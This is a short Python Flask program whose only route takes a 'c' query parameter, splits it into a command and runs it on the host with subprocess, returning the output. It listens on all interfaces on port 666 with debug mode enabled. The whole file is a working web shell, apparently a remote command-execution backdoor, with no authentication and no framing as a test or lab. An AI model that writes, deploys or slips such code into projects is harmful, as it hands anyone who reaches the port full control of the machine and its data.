import flask
from flask import request
import subprocess

app = flask.Flask(__name__)

@app.route('/', methods=['GET'])
def main():
	command = request.args.get("c").split(" ")
	output = subprocess.check_output(command)
	return output
    
if __name__ == '__main__':
      app.run(debug=True, host='0.0.0.0', port=666)
